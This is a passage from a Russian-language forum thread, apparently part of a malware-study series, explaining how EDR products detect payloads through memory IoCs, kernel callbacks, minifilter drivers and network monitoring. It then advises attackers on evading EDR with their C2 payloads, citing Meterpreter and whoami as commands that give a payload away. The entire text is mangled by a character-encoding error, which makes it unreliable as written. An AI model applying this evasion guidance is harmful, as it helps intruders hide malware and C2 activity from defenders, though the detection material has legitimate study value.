–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤ –æ—Å–Ω–æ–≤–µ –ø–∞–º—è—Ç–∏ –æ—Ç–Ω–æ—Å—è—Ç—Å—è –∫ IoC –∏ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞–º, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–∑–¥–∞—é—Ç—Å—è –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤–∞—à–µ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
–≠—Ç–∏ IoC –º–æ–≥—É—Ç –±—ã—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∏—è–º–∏ –∫—É—á–∏, —Ç—Ä–∞–º–ø–ª–∏–Ω–∞–º–∏ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ API, —Å—Ç–µ–∫–∞–º–∏ –ø–æ—Ç–æ–∫–æ–≤ –∏ —Å–µ–∫—Ü–∏—è–º–∏ –ø–∞–º—è—Ç–∏ RWX.<br />
<br />
–î–µ—Ç–µ–∫—Ç –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –∫–æ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –≥–¥–µ –º–æ–∂–Ω–æ –≤–Ω–æ—Å–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –µ–µ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ –≤ –ø–∞–º—è—Ç–∏.<br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –≤ –ø–∞–º—è—Ç–∏</b> - —ç—Ç–æ –ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∞—è –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –∏ –æ–¥–∏–Ω –∏–∑ —Å–∞–º—ã—Ö —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã—Ö —Å–ø–æ—Å–æ–±–æ–≤ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞.<br />
<br />
<b>–û–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã —è–¥—Ä–∞ –∏ –¥—Ä–∞–π–≤–µ—Ä—ã Minifilter</b><br />
<br />
–û–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã —è–¥—Ä–∞ - —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ Windows, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –∫–æ–¥—É –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –û–° –≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –º–æ–º–µ–Ω—Ç—ã –∏–ª–∏ –∫–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å–æ–±—ã—Ç–∏–µ. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–º–µ—Ä—ã —Å–æ–±—ã—Ç–∏–π: —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞, –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞ –∏ –∑–∞–≥—Ä—É–∑–∫–∞ DLL.<br />
<br />
–ö–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å–æ–±—ã—Ç–∏–µ, –û–° –≤—ã–∑—ã–≤–∞–µ—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ —É–≤–µ–¥–æ–º–ª—è–µ—Ç –∫–æ–¥ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ –æ —Ç–æ–º, —á—Ç–æ —ç—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ. –≠—Ç–æ—Ç &quot;–∫–æ–¥ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞&quot; –º–æ–∂–µ—Ç –±—ã—Ç—å –¥—Ä–∞–π–≤–µ—Ä–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞, —Å–æ–∑–¥–∞–Ω–Ω—ã–º –ø—Ä–æ–¥—É–∫—Ç–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ - —ç—Ç–æ EDR.<br />
<br />
–°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –ø–ª–æ—Ö–æ –Ω–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –∏–ª–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ –æ–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã –º–æ–≥—É—Ç –≤—ã–∑–≤–∞—Ç—å –Ω–µ—Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç—å —Å–∏—Å—Ç–µ–º—ã, –ø—Ä–æ–±–ª–µ–º—ã —Å –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å—é –∏–ª–∏ –¥–∞–∂–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø–æ—ç—Ç–æ–º—É —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤—Å–µ–º–∏ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—è–º–∏ EDR.<br />
<br />
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–º–µ—Ä—ã –æ–±—Ä–∞—Ç–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω—ã –Ω–∏–∂–µ.<br />
<br />
<b>PspCreateProcessNotifyRoutine</b> - —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π –≤—ã–∑–æ–≤, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä–æ–º, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>PspLoadImageNotifyRoutine</b> - —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π –≤—ã–∑–æ–≤, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä–æ–º, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –æ–±—Ä–∞–∑(DLL –∏–ª–∏ EXE) –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è (–∏–ª–∏ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è) –≤ –ø–∞–º—è—Ç–∏.<br />
<br />
<b>CmRegisterCallbackEx</b> - —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π –≤—ã–∑–æ–≤, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –¥—Ä–∞–π–≤–µ—Ä–æ–º, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø–æ—Ç–æ–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å —Ä–µ–µ—Å—Ç—Ä–æ–º. –î–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞, –∏–∑—É—á–µ–Ω–∏—è –∏ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ —Å–æ–±—ã—Ç–∏–π –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞ Microsoft —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä–∞–π–≤–µ—Ä—ã minifilter.<br />
<br />
–î—Ä–∞–π–≤–µ—Ä—ã minifilter –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ Windows –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞ –º–µ–∂–¥—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ –∏ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–æ–π. –≠—Ç–∏ –¥—Ä–∞–π–≤–µ—Ä—ã —Ä–∞–±–æ—Ç–∞—é—Ç –Ω–∞ —É—Ä–æ–≤–Ω–µ –º–µ–∂–¥—É —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–æ–π –∏ –¥—Ä–∞–π–≤–µ—Ä–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞, –∫–æ—Ç–æ—Ä—ã–π –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Ñ–∏–∑–∏—á–µ—Å–∫–∏–µ –∑–∞–ø—Ä–æ—Å—ã –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞. EDR –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä–∞–π–≤–µ—Ä—ã minifilter –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è –∫–∞–∂–¥–æ–π –æ–ø–µ—Ä–∞—Ü–∏–∏ –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞, –∫–æ—Ç–æ—Ä–∞—è —É–≤–µ–¥–æ–º–∏—Ç –¥—Ä–∞–π–≤–µ—Ä –æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏—è—Ö, —Ç–∞–∫–∏—Ö –∫–∞–∫ —Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–∞ –∏ —Ç. –¥.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –æ–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã —è–¥—Ä–∞ –º–æ–≥—É—Ç –±—ã—Ç—å –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º Minifilter EDR –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–µ–∏–∑–º–µ–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–∞–ø—Ä—è–º—É—é –∏–∑ —è–¥—Ä–∞, –∞ –Ω–µ –∏–∑ —Ä–µ—Å—É—Ä—Å–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞, —Ç–∞–∫ –∫–∞–∫ –æ–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –ø–æ–¥–¥–µ–ª–∞–Ω—ã –∏ –∏–∑–º–µ–Ω–µ–Ω—ã.<br />
<br />
–ü—Ä–∏–º–µ—Ä —Ç–æ–≥–æ, –∫–∞–∫ EDR –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä–∞–π–≤–µ—Ä—ã minifilter –∏ –æ–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã —è–¥—Ä–∞, - –≤—ã–∑–æ–≤ PspCreateProcessNotifyRoutine –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ EDR –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –µ–≥–æ DLL –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–æ–∑–¥–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã, –≤ –∫–æ—Ç–æ—Ä–æ–º –æ–Ω –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—Ç —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∞ –∑–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å –¥—Ä–∞–π–≤–µ—Ä–∞ minifilter –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∑–∞–ø—Ä–æ—Å–æ–≤ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã –≤–≤–æ–¥–∞-–≤—ã–≤–æ–¥–∞ —ç—Ç–∏–º –≤–Ω–æ–≤—å —Å–æ–∑–¥–∞–Ω–Ω—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.<br />
<br />
<b>–°–µ—Ç–µ–≤—ã–µ IoC</b><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å—ã, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—â–∏–µ —Å–µ—Ç–µ–≤—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è, –≤—ã–∑—ã–≤–∞—é—Ç –±–æ–ª—å—à–µ–µ –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–µ –∏–∑-–∑–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º C&amp;C, –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã–º –∞—Ç–∞–∫—É—é—â–∏–º. –°–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ç—å—é –±—É–¥—É—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å—Å—è EDR, –∏ –±—É–¥–µ—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ, –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å, –∫–æ—Ç–æ—Ä—ã–π –æ–±—ã—á–Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–µ—Ç–µ–≤–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ, –Ω–∞—á–Ω–µ—Ç —ç—Ç–æ –¥–µ–ª–∞—Ç—å. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –±—ã–ª–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏–Ω—ä–µ–∫—Ü–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å notepad.exe, –∏ –æ–Ω –Ω–∞—á–∞–ª —Å–æ–µ–¥–∏–Ω—è—Ç—å—Å—è —Å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–æ–º, —ç—Ç–æ —Å—á–∏—Ç–∞–µ—Ç—Å—è –≤—ã—Å–æ–∫–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –∞–Ω–∞–ª–∏–∑–∏—Ä—É—é—Ç—Å—è –∞—Å–ø–µ–∫—Ç—ã —Å–µ—Ç–µ–≤–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ —Ü–µ–ª–µ–≤–æ–π IP-–∞–¥—Ä–µ—Å, –¥–æ–º–µ–Ω–Ω–æ–µ –∏–º—è, –Ω–æ–º–µ—Ä –ø–æ—Ä—Ç–∞ –∏ —Å–µ—Ç–µ–≤–æ–π —Ç—Ä–∞—Ñ–∏–∫.<br />
<br />
<b>–û–±—Ö–æ–¥ EDR</b><br />
<br />
–û–±—Ö–æ–¥ EDR –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–ª–æ–∂–Ω—ã–º —Å–Ω–∞—á–∞–ª–∞ –∏ —Ç—Ä–µ–±—É–µ—Ç –≥—Ä—É–ø–ø—ã –º–µ—Ç–æ–¥–æ–≤ –∏ —Ç–µ—Ö–Ω–∏–∫, –∞ –Ω–µ –ø–æ–ª–∞–≥–∞–Ω–∏—è –Ω–∞ –æ–¥–∏–Ω –ø–æ–¥—Ö–æ–¥. –ü—Ä–∏—á–∏–Ω–∞, –ø–æ –∫–æ—Ç–æ—Ä–æ–π —Ç—Ä–µ–±—É—é—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Ç–æ–¥–æ–≤, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ EDR –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–æ–ª–µ–µ –æ–¥–Ω–æ–π —Ç–µ—Ö–Ω–∏–∫–∏ –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
–ò–Ω–æ–≥–¥–∞ –º–æ–≥—É—Ç –ø–æ—Ç—Ä–µ–±–æ–≤–∞—Ç—å—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–π –¥–ª—è —Ä–µ—à–µ–Ω–∏—è –æ–¥–Ω–æ–π –∏ —Ç–æ–π –∂–µ –ø—Ä–æ–±–ª–µ–º—ã.<br />
<br />
–í–∞–∂–Ω–æ –ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ –æ–±—Ö–æ–¥–∞ EDR –ø–æ–∑–≤–æ–ª—è—é—Ç –∑–∞–≥—Ä—É–∑—á–∏–∫—É –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è,<b><u> –Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –≤ –Ω–µ–º –ø–æ–ª–µ–∑–Ω—ã–π –Ω–∞–≥—Ä—É–∑–∫–∞ C&amp;C.</u></b> –≠—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å —Å–≤—è–∑–∞–Ω–æ —Å –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –ø—Ä–∏—á–∏–Ω–∞–º–∏:<br />
<br />
–ê–Ω–æ–º–∞–ª–∏–∏ —Å–µ—Ç–∏ C&amp;C —Ö–æ—Ä–æ—à–æ –∏–∑–≤–µ—Å—Ç–Ω—ã –∏ –ø–æ–¥–ø–∏—Å–∞–Ω—ã EDR. –ó–∞–≥—Ä—É–∑—á–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø—Ä—è–º—ã–µ/–∫–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –∏ —É—Å–ø–µ—à–Ω–æ –∏–∑–±–µ–∂–∞–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è, <b>–Ω–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ C&amp;C —ç—Ç–æ–≥–æ –Ω–µ –¥–µ–ª–∞–µ—Ç –∏ –ø–æ-–ø—Ä–µ–∂–Ω–µ–º—É –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏. </b><br />
<br />
–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ C&amp;C –≤—ã–ø–æ–ª–Ω–∏–ª–∞ –¥–µ—Ç–µ–∫—Ç–∏—Ä—É–µ–º—É—é –∫–æ–º–∞–Ω–¥—É, –ª–∏–±–æ –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ, –ª–∏–±–æ –Ω–µ–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ. –¢–∞–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã –ø—Ä–∏–≤–ª–µ–∫—É—Ç –≤–Ω–∏–º–∞–Ω–∏–µ EDR, –∏ –≤–∞—à–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –±—É–¥–µ—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∑–∞–ø—É—Å—Ç–∏—Ç–µ cmd.exe –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É whoami).<br />
<br />
C&amp;C –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —É–∑–Ω–∞–≤–∞–µ–º—ã–µ –∏–º–µ–Ω–æ–≤–∞–Ω–Ω—ã–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ã IPC –∏–ª–∏ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ (–Ω–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ IPC - —ç—Ç–æ –º—å—é—Ç–µ–∫—Å—ã, —Å–µ–º–∞—Ñ–æ—Ä—ã, —Å–æ–∫–µ—Ç—ã). –ù–∞–ø—Ä–∏–º–µ—Ä, –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã &quot;load powershell&quot; —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Meterpreter –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —Å–ª–µ–¥—É—é—â–µ–º—É.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795165049.png"
		data-src="https://osint42.org/attachments/1746795165049-png.317/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795165049-png.317/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795165049.png"
			title="1746795165049.png"
			width="1691" height="879" loading="lazy" />
	</div><br />
<br />
–ü–æ —Ç–∞–∫–∏–º –∏ –º–Ω–æ–≥–∏–º –¥—Ä—É–≥–∏–º –ø—Ä–∏—á–∏–Ω–∞–º –±—É–¥–µ—Ç –º–Ω–æ–≥–æ —Å–ª—É—á–∞–µ–≤, –∫–æ–≥–¥–∞ –≤–∞—à–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –≤–∞—à–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º C2, –Ω–æ –±—É–¥–µ—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –∫–æ–º–∞–Ω–¥. –ü–æ—ç—Ç–æ–º—É –≤—ã–±–æ—Ä –≤–∞—à–µ–≥–æ C2 —è–≤–ª—è–µ—Ç—Å—è –≤–∞–∂–Ω—ã–º —Ä–µ—à–µ–Ω–∏–µ–º –¥–ª—è —É–∫–ª–æ–Ω–µ–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –í—Å–µ–≥–¥–∞ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≥–∏–±–∫—É—é –∏ –ø–æ–¥–¥–∞—é—â—É—é—Å—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É C2, –∞ –Ω–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—É—é.</div>
						

							<h2>–ü—Ä–æ –¥–µ—Ç–µ–∫—Ç –≤ –ø–∞–º—è—Ç–∏. –ù–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–µ–ª–∞–µ—à—å –∏ —ç—Ç–æ –Ω–µ–∏–∑–±–µ–∂–Ω–æ)</h2>

							

							

							<div class="bbWrapper">–í—Å–µ–º –ø—Ä–∏–≤–µ—Ç!<br />
<br />
–•–æ—Ç–µ–ª –µ—â—ë –¥–æ–±–∞–≤–∏—Ç—å:<br />
<br />
–í–æ—Ç –≤ —ç—Ç–æ–π —Ç–µ–º–µ:–û–±—Ö–æ–¥ EDRs.–ü–æ—Å–ª–µ–¥–Ω—è—è —Ç–µ–º–∞ —Ü–∏–∫–ª–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–ë—ã–ª –ø–æ–¥–Ω—è—Ç –≤–æ–ø—Ä–æ—Å –¥–µ—Ç–µ–∫—Ç–∞ –ø–∞–º—è—Ç–∏, –¥–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–∞–∫–∏–µ —à—Ç—É–∫–∏:–û—Ç–∫—Ä—ã–≤–∞–µ–º –≤—Ä–∞—Ç–∞ –∞–¥–∞ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–ù–æ —Ç–µ–º –Ω–µ –º–µ–Ω–µ–µ –≤–∞–∂–Ω–æ —á—Ç–æ-–±—ã —Å–∞–º–∞ –Ω–∞–≥—Ä—É–∑–∫–∞ —Ç–æ–∂–µ –Ω–µ –ø–∞–ª–∏–ª–∞—Å—å, –≤ —Ç–µ–º–µ –ø—Ä–æ EDR  –ø—Ä–æ —ç—Ç–æ —Å–∫–∞–∑–∞–Ω–æ.<br />
<br />
